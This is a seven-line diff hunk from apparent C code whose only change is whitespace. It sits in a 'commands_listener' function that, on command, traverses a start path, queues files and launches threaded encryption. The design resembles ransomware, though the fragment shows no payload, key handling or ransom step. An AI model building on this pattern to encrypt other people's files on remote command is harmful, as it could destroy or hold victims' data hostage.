@@ -60,7 +60,7 @@ void *commands_listener(void *arg) {
                 clear_queue(&queue);
                 traverse(start_path);
                 enqueue(&queue, "END_ENCRYPT");
-
+ 
                 printf("start_encryption\n");
                 initialize_threads(THREADS_NUMBER, true);
                 watcher_on = true;
